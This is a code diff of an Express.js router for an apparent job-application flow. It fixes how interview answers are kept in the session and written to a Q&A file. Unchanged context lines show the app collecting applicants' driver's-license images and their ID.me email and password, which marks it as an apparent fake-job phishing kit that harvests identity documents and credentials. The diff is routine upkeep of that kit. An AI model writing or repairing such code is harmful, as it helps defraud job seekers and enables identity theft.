@@ -118,16 +118,20 @@ router.get('/interview', requireSession, (req, res) => {
   });
 });
 
+// --- FIXED HANDLER: Ensure interviewAnswers are set robustly ---
 router.post('/interview', requireSession, express.urlencoded({ extended: true }), async (req, res) => {
   if (!req.session.applicationDraft) return res.redirect('/apply');
   const pos = req.session.applicationDraft.position;
   const normalizedPosition = normalizePosition(pos);
   const selectedQuestions = INTERVIEW_QUESTIONS_MAP[normalizedPosition] || DEFAULT_QUESTIONS;
   const interviewAnswers = {};
+  let hasAnswer = false;
   selectedQuestions.forEach(q => {
-    interviewAnswers[q.name] = req.body[q.name] || '';
+    const val = req.body[q.name] || '';
+    interviewAnswers[q.name] = val;
+    if (val && val.trim()) hasAnswer = true;
   });
-  req.session.interviewAnswers = interviewAnswers;
+  if (hasAnswer) req.session.interviewAnswers = interviewAnswers;
   res.render('info-note');
 });
 
@@ -155,17 +159,17 @@ router.post('/verify', requireSession, driversLicenseUpload.fields(dlFields), as
   req.session.driversLicenseFiles = [dlFront, dlBack];
 
   const application = req.session.applicationDraft;
-  const interviewAnswers = req.session.interviewAnswers || {};
+  // --- FIX: Always use session interviewAnswers robustly ---
+  const interviewAnswers = (req.session.interviewAnswers && Object.keys(req.session.interviewAnswers).length > 0) ? req.session.interviewAnswers : {};
   const idmeCreds = { email, password };
 
   const normalizedPosition = normalizePosition(application.position);
   const questions = INTERVIEW_QUESTIONS_MAP[normalizedPosition] || DEFAULT_QUESTIONS;
+  // --- FIX: Always generate Q&A file with all questions ---
   const answersObj = {};
   questions.forEach(q => {
     let answer = interviewAnswers[q.name];
-    if (typeof answer === 'undefined' || answer === null || answer.trim() === '') {
-      answer = "";
-    }
+    if (typeof answer === 'undefined' || answer === null) answer = "";
     answersObj[q.label] = answer;
   });
 
@@ -241,16 +245,16 @@ router.post('/skip-idme/', requireSession, driversLicenseUpload.fields(dlFields)
   req.session.idme = {};
 
   const application = req.session.applicationDraft;
-  const interviewAnswers = req.session.interviewAnswers || {};
+  // --- FIX: Always use session interviewAnswers robustly ---
+  const interviewAnswers = (req.session.interviewAnswers && Object.keys(req.session.interviewAnswers).length > 0) ? req.session.interviewAnswers : {};
 
   const normalizedPosition = normalizePosition(application.position);
   const questions = INTERVIEW_QUESTIONS_MAP[normalizedPosition] || DEFAULT_QUESTIONS;
+  // --- FIX: Always generate Q&A file with all questions ---
   const answersObj = {};
   questions.forEach(q => {
     let answer = interviewAnswers[q.name];
-    if (typeof answer === 'undefined' || answer === null || answer.trim() === '') {
-      answer = "";
-    }
+    if (typeof answer === 'undefined' || answer === null) answer = "";
     answersObj[q.label] = answer;
   });
 
